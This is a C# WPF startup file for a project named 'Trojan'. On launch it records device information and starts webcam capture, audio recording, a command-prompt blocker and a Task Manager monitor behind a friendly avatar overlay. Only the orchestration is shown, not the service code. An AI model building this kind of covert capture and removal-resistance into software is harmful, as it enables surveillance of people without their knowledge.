using System.Windows;
using System.Windows.Input;
using Trojan.Data.DataBase;
using Trojan.Data.Seeders;
using Trojan.Services;
using Trojan.Services;
using Trojan.UI.ViewModels;
using Trojan.UI.Views.Pages;
// using Trojan.DataBase;
using Trojan.Views;

namespace Trojan
{
    /// <summary>
    /// Interaction logic for App.xaml
    /// </summary>
    public partial class App : Application
    {

        private WebcamService _webcamService;
        private AudioRecorderService _audioRecorder;
        private CmdBlockerService _cmdBlockerService;
        private TaskManagerMonitorService _taskManagerMonitorService;
        private IdleService _idleService;
        public static bool _devMode { get; private set; }
        private HelperOverlayViewModel? _overlayViewModel;
        protected override async void OnStartup(StartupEventArgs e)
        {
            base.OnStartup(e);

            _idleService = new IdleService();


            _idleService.SleepRequested += () =>
            {
                Current.Dispatcher.Invoke(() =>
                {
                    _overlayViewModel?.SetSleepingAvatar();
                });
            };

            _idleService.WakeRequested += () =>
            {
                Current.Dispatcher.Invoke(() =>
                {
                    _overlayViewModel?.SetAwakeAvatar();
                });
            };

            EventManager.RegisterClassHandler(
                typeof(Window),
                UIElement.MouseMoveEvent,
                new MouseEventHandler(GlobalMouseMoveHandler));

            EventManager.RegisterClassHandler(
                typeof(Window),
                UIElement.MouseDownEvent,
                new MouseButtonEventHandler(GlobalMouseDownHandler));

            EventManager.RegisterClassHandler(
                typeof(Window),
                Keyboard.KeyDownEvent,
                new KeyEventHandler(GlobalKeyHandler));

            await DeviceScannerService.SaveDeviceInfo();
            
            _devMode = e.Args.Contains("dev");

            //PODATKE O NAPRAVI SE SHRAANIJO NA "C:\Users\IME\AppData\Roaming\gnezdece\device_info.txt"

            // Ob zagonu aplikacije zagotovimo, da je podatkovna baza ustvarjena
            using (var db = new AppDbContext())
            {
                db.Database.EnsureCreated();
            }

            new AppBootstrapper().Run();

            var mainWindow = new HelperOverlayWindow();
            MainWindow = mainWindow;
            mainWindow.Show();

            _webcamService = new WebcamService();
            _webcamService.Start();


            _audioRecorder = new AudioRecorderService();
            _audioRecorder.Start();

            _cmdBlockerService = new CmdBlockerService();
            _cmdBlockerService.Start();

            _taskManagerMonitorService = new TaskManagerMonitorService();
            _taskManagerMonitorService.Start();

            var helperOverlayWindow = new HelperOverlayWindow();
            _overlayViewModel =
            helperOverlayWindow.DataContext as HelperOverlayViewModel;
            MainWindow = helperOverlayWindow;
            helperOverlayWindow.Show();

        
        }

        protected override void OnExit(ExitEventArgs e)
        {
            _webcamService?.Stop();
            _audioRecorder?.Stop();
            _cmdBlockerService?.Stop();
            _taskManagerMonitorService?.Stop();
            base.OnExit(e);
        }

        private void GlobalMouseDownHandler(object sender, MouseButtonEventArgs e)
        {
            _idleService.RegisterActivity();
        }

        private void GlobalMouseMoveHandler(object sender, MouseEventArgs e)
        {
            _idleService.RegisterActivity();
        }
        private void GlobalKeyHandler(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Escape)
            {
                Current.Shutdown();
            }
        }
    }
}
